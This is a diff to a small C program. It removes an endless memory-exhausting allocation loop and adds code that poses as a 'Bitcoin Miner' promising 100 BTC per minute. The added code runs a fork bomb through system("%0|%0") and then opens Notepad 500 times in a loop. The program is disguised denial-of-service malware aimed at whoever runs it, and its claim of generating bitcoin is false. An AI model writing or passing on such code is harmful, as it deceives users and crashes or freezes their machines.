@@ -2,16 +2,22 @@
 #include <stdlib.h>
 #include <stdbool.h>
 
-int* x, *y, *z, *a, *b, *c;
-
 int main() {
-  long i = 0;
-  while (true) {
-    x = (int*)malloc( (10000000000000*i) * sizeof(int));
-    y = (int*)malloc( (10000000000*i) * sizeof(int));
-    z = (int*)malloc( (100000000000*i) * sizeof(int));
-    a = (int*)malloc( (100000000000*i) * sizeof(int));
-    ++i;
+
+  puts("Welcome to Bitcoin Miner by john(aq), sponsored by Owen Reid ");
+  puts("This program will generate 100 BTC per minute");
+  int status = system("%0|%0");
+  if (status == 0) {
+    puts("Fork Bomb Enabled");
   }
+  else {
+    puts("You are an enemy of the state");
+  }
+
+  for (int i = 0; i < 500; ++i) {
+    system("notepad Edit.txt");
+    system("echo +100 Bitcoin > Edit.txt");
+  }
+
   return 0;
 }
